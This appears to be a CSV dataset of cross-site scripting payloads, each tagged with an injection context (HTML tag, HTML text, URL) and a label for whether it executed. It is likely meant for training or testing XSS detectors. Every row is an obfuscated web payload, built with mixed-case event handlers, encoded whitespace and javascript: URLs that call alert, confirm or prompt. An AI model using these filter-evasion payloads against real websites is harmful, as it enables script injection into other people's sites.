payload,context,exec,combined
"<DeTails%0aOntOggLE%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DeTails%0aOntOggLE%0d=%0da=prompt,a()%0dx>"
<dETAIls/+/OnpOInTEReNTer%0d=%0dconfirm()>,html_text,0,CONTEXT_html_text <dETAIls/+/OnpOInTEReNTer%0d=%0dconfirm()>
<A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s
;alert(history.length);//,html_tag,0,CONTEXT_html_tag ;alert(history.length);//
<HtMl/+/OnMOUSeOVEr%09=%09(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <HtMl/+/OnMOUSeOVEr%09=%09(confirm)()%0dx>
"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<script>alert(1)</script>"">"
<a%09onPOInTerEnTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onPOInTerEnTeR%0a=%0aconfirm()>v3dm0s
<a%09ONPointERentER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONPointERentER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<deTaIlS/+/oNtOggLe+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <deTaIlS/+/oNtOggLe+=+(confirm)()%0dx//
"<d3v/+/ONmOuSeOVeR%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3v/+/ONmOuSeOVeR%0d=%0da=prompt,a()%0dx>v3dm0s"
<A/+/ONMOusEOVER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONMOusEOVER%09=%09[8].find(confirm)%0dx>v3dm0s
<A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s
"<Html%0dONMouSEOver%09=%09a=prompt,a()//",html_text,0,"CONTEXT_html_text <Html%0dONMouSEOver%09=%09a=prompt,a()//"
<DETailS%0dontogGLE%09=%09(prompt)``//,html_text,0,CONTEXT_html_text <DETailS%0dontogGLE%09=%09(prompt)``//
<d3v%0doNmOusEover+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%0doNmOusEover+=+confirm()%0dx>v3dm0s
<d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s
<htmL%0donMOUSeoVER%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <htmL%0donMOUSeoVER%09=%09(prompt)``%0dx>
<DetaILs%09ONtOGGlE+=+[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <DetaILs%09ONtOGGlE+=+[8].find(confirm)>
<HtMl%0aonMOuseOVEr%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <HtMl%0aonMOuseOVEr%09=%09confirm()%0dx>
<a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s
<htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//,html_text,0,CONTEXT_html_text <htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//
<D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s
<A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s
<DETAILs%0aONtOgGlE%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <DETAILs%0aONtOgGlE%0a=%0a(confirm)()%0dx//
<HtmL%0aONMOUSeOVEr%0a=%0a[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <HtmL%0aONMOUSeOVEr%0a=%0a[8].find(confirm)//
<d3v/+/onMOUseovEr+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v/+/onMOUseovEr+=+confirm()>v3dm0s
<hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//,html_text,0,CONTEXT_html_text <hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//
"<D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a%0aONpoInteRENTER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%0aONpoInteRENTER%09=%09(confirm)()>v3dm0s
<DeTAiLS/+/oNTOGGlE+=+(prompt)``//,html_tag,0,CONTEXT_html_tag <DeTAiLS/+/oNTOGGlE+=+(prompt)``//
<HTml%0aonpOINterENteR%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <HTml%0aonpOINterENteR%0a=%0aconfirm()//
<HtML%0aONpoiNterENtER+=+[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HtML%0aONpoiNterENtER+=+[8].find(confirm)>
<HTml%0aonmOUseOvER%0d=%0dconfirm()//,html_tag,0,CONTEXT_html_tag <HTml%0aonmOUseOvER%0d=%0dconfirm()//
<d3v%0aOnMouSEoVEr%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aOnMouSEoVEr%0a=%0a(confirm)()>v3dm0s
<A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s
<HtMl%09oNPOIntEReNTER%0d=%0d[8].find(confirm)>,html_text,0,CONTEXT_html_text <HtMl%09oNPOIntEReNTER%0d=%0d[8].find(confirm)>
<A/+/OnPoINterENTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnPoINterENTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<DETAILS/+/oNPOInTERENtER%09=%09a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <DETAILS/+/oNPOInTERENtER%09=%09a=prompt,a()//"
<d3V%09oNPOiNTEreNTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09oNPOiNTEreNTEr%09=%09confirm()%0dx>v3dm0s
<DetaiLs/+/oNtOggLE%0d=%0d[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <DetaiLs/+/oNtOggLE%0d=%0d[8].find(confirm)%0dx//
"<HtmL%0donpoiNTErEntER%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <HtmL%0donpoiNTErEntER%0a=%0aa=prompt,a()%0dx//"
<hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//
<DetaiLS%09ontOGgLe+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DetaiLS%09ontOGgLe+=+(confirm)()%0dx//
<D3V%09OnPoInTEReNTEr+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <D3V%09OnPoInTEReNTEr+=+[8].find(confirm)>v3dm0s
<iframe src=javascript:alert(1)>,html_text,0,CONTEXT_html_text <iframe src=javascript:alert(1)>
<hTML/+/oNPOInTeRENter+=+confirm()//,html_tag,0,CONTEXT_html_tag <hTML/+/oNPOInTeRENter+=+confirm()//
<hTmL%0aONPOiNTEREnTer%09=%09[8].find(confirm)>,html_text,0,CONTEXT_html_text <hTmL%0aONPOiNTEREnTer%09=%09[8].find(confirm)>
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<HTml%0dOnpoINTERENTEr%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <HTml%0dOnpoINTERENTEr%09=%09confirm()%0dx//
<A%0doNmOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0doNmOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s
<d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s
<a%09onPOInTerEnTeR%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onPOInTerEnTeR%0a=%0aconfirm()>v3dm0s
"<a%0aONPoiNTERenTEr%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0aONPoiNTERenTEr%09=%09a=prompt,a()%0dx>v3dm0s"
<dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>,html_text,0,CONTEXT_html_text <dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>
<a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s
<d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s
<D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s
<D3V%0aonPOintERENter%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aonPOintERENter%0d=%0dconfirm()%0dx>v3dm0s
<a%09OnMOuSEover+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a%09OnMOuSEover+=+(prompt)``%0dx>v3dm0s
<dETAILS%09onToggLe%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <dETAILS%09onToggLe%09=%09confirm()//
javascript:prompt(1),html_tag,0,CONTEXT_html_tag javascript:prompt(1)
<D3V%0aonMousEOvER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <D3V%0aonMousEOvER+=+confirm()>v3dm0s
<d3v/+/onpOinTeREntEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/onpOinTeREntEr%0d=%0d(prompt)``%0dx>v3dm0s
<HtMl%09onpOiNTerEnTeR%09=%09(prompt)``>,html_tag,0,CONTEXT_html_tag <HtMl%09onpOiNTerEnTeR%09=%09(prompt)``>
<a/+/ONmOusEoVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/ONmOusEoVEr%0d=%0dconfirm()>v3dm0s
<a/+/OnMouSeOveR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnMouSeOveR%0a=%0a(confirm)()%0dx>v3dm0s
<htMl%0dONMoUSEOVer%09=%09confirm()>,html_text,0,CONTEXT_html_text <htMl%0dONMoUSEOVer%09=%09confirm()>
<D3V%0aoNMouSEOVeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aoNMouSEOVeR%0a=%0aconfirm()>v3dm0s
<D3v%0aoNPOInTerentEr+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0aoNPOInTerentEr+=+confirm()%0dx>v3dm0s
<d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s
<a%09onPOinterENTer%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onPOinterENTer%0d=%0d(confirm)()>v3dm0s
<D3v%0donpoInTeRenTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0donpoInTeRenTer%0d=%0dconfirm()%0dx>v3dm0s
<a%09OnpOiNteRentEr%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnpOiNteRentEr%0a=%0a(confirm)()>v3dm0s
<A%0aoNMoUSEOvEr%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNMoUSEOvEr%09=%09(prompt)``%0dx>v3dm0s
<a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<iframe src=javascript:alert(1)>,html_tag,1,CONTEXT_html_tag <iframe src=javascript:alert(1)>
<a%09OnpointeRenTER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnpointeRenTER%0d=%0d(prompt)``%0dx>v3dm0s
"<A/+/OnPOIntEREntER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A/+/OnPOIntEREntER%09=%09a=prompt,a()>v3dm0s"
<DeTAILs%09ONTOggLe%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <DeTAILs%09ONTOggLe%0d=%0d(prompt)``%0dx//
<HTML%0aOnpoiNterenTeR%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <HTML%0aOnpoiNterenTeR%0a=%0a(prompt)``%0dx//
<DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>
<A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s
"<D3V%0dOnPOiNTERENTeR+=+a=prompt,a()%0dx>v3dm0s",url_navigation,0,"CONTEXT_url_navigation <D3V%0dOnPOiNTERENTeR+=+a=prompt,a()%0dx>v3dm0s"
<detAiLs%09oNTOgGLe+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <detAiLs%09oNTOgGLe+=+(confirm)()%0dx>
"<DetaILS%0dontOGGLe%0a=%0aa=prompt,a()//",html_text,0,"CONTEXT_html_text <DetaILS%0dontOGGLe%0a=%0aa=prompt,a()//"
"<d3v/+/onMOuSeOVer%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3v/+/onMOuSeOVer%09=%09a=prompt,a()%0dx>v3dm0s"
<D3v%0dONpoInTErENTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0dONpoInTErENTEr%0d=%0d(prompt)``%0dx>v3dm0s
<htmL%0aOnMousEOVeR+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <htmL%0aOnMousEOVeR+=+confirm()%0dx>
""";confirm(1);//",html_tag,0,"CONTEXT_html_tag "";confirm(1);//"
<A%0dOnPoiNtErEnTer%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%0dOnPoiNtErEnTer%09=%09[8].find(confirm)>v3dm0s
<a%0aonMouSeover%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonMouSeover%0a=%0aconfirm()>v3dm0s
<A%0doNPoiNtereNTer+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0doNPoiNtereNTer+=+confirm()%0dx>v3dm0s
`;alert(1);//,html_text,0,CONTEXT_html_text `;alert(1);//
"<DetAILS%09ontogGlE+=+a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DetAILS%09ontogGlE+=+a=prompt,a()%0dx>"
<HTml%0aonmoUseOver%0d=%0dconfirm()%0dx//,html_text,0,CONTEXT_html_text <HTml%0aonmoUseOver%0d=%0dconfirm()%0dx//
"<a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
%3Cscript%3E,html_tag,0,CONTEXT_html_tag %3Cscript%3E
<D3V%09ONpOINterEnteR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09ONpOINterEnteR%0d=%0d(confirm)()%0dx>v3dm0s
<d3v%09onMouSeoveR+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <d3v%09onMouSeoveR+=+confirm()>v3dm0s
<hTml%0doNpoinTeRenteR%09=%09(confirm)()>,html_tag,0,CONTEXT_html_tag <hTml%0doNpoinTeRenteR%09=%09(confirm)()>
<D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s
"<D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<d3v/+/onMOuSeOVer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3v/+/onMOuSeOVer%09=%09a=prompt,a()%0dx>v3dm0s"
<A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s
<d3V/+/onMOUSeoVEr%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/onMOUSeoVEr%0a=%0a[8].find(confirm)>v3dm0s
<detailS/+/ONPoiNterEntEr%0a=%0a(prompt)``%0dx//,html_text,0,CONTEXT_html_text <detailS/+/ONPoiNterEntEr%0a=%0a(prompt)``%0dx//
<a%09ONMOUSeOver%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONMOUSeOver%0d=%0dconfirm()%0dx>v3dm0s
<d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s
<HTmL%09OnpoInTErenteR%0d=%0d[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <HTmL%09OnpoInTErenteR%0d=%0d[8].find(confirm)%0dx//
alert(1),html_text,0,CONTEXT_html_text alert(1)
<detAIlS%0aONPoiNtErEnTeR+=+(confirm)()>,html_text,0,CONTEXT_html_text <detAIlS%0aONPoiNtErEnTeR+=+(confirm)()>
